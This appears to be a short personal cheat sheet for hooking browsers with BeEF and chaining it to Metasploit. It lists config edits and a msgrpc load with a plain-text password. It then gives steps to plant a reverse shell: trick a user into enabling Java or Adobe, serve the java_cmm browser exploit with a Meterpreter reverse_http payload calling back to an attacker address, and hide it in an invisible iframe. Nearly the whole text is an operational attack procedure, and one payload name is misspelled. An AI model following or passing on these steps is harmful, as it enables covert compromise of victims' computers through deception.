hook beef with metasploit setup
===============================
- cd /usr/share/beef-xss/
- leafpad config.yaml -> change "metasploit" to true
- cd /usr/share/beef-xss/extensions/metasploit/
- leafpad config.yaml -> change host and call back host to beef host address (public or local); os: ‘custom’, path: ‘/usr/share/metasploit-framework’
- cd /usr/share/metasploit-framework/config/
- leafpad database.yml -> make sure the postgresql name is msf

hook
=======
- load msgrpc ServerHost=10.0.0.6 Pass=abc123
- cd /usr/share/beef-xss/
- ./beef


create reverse shell
========================
- somehow trick the user enable java or adobe etc.
- use exploit/windows/browser/java_cmm
- set srvhost 10.0.0.6 (different ports)
- set target 0/1
- set payload windows/metepreter/reverse_http
- set lhost 10.0.0.6
- run
- go to beef; misc; create invisible iframe
- type in the address given by metasploit
